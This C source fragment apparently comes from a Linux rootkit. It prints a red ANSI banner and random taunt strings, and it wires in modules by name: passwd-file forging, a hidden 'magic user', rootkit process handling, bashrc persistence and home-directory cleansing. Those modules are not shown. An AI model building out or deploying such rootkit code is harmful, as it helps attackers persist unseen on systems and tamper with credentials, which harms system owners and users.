#ifndef NO_ROOTKIT_ANSI
#include "banner.h"
#endif
#include "rolf.h"
void dorolf(void){
#ifndef NO_ROOTKIT_ANSI
    printf("\033[0;31m");
    for(int i = 0; i != BDANSI_SIZE; i++)
        printf("%c", bdansi[i]);
    printf("\033[0m\n");
#endif
    srand(time(NULL));
    char *randrolf = rolfs[rand() % ROLFS_SIZE];
    printf("\e[1;31m%s\e[0m\n", randrolf);
}

void sncatbuf(char *buf, size_t bufsize, char *string);
FILE *forgepasswd(const char *pathname);
#include "passwd.c"

int getlasttime(const char *timepath);
int writenewtime(const char *timepath, int curtime);
int timediff(const char *timepath, int curtime);
int itistime(const char *timepath, int curtime, int timer);
void unsetbadvars(void);
int magicusr(void);
int rkprocup(void);
#include "gid/gid.h"
#include "magicusr.c"
#include "rkproc.c"
#include "times.c"

#ifdef ROOTKIT_BASHRC
int writebashrc(void);
void checkbashrc(void);
#include "bashrc.c"

#endif


#ifdef CLEANSE_HOMEDIR
void bdvcleanse(void);
#include "cleanse.c"
#endif
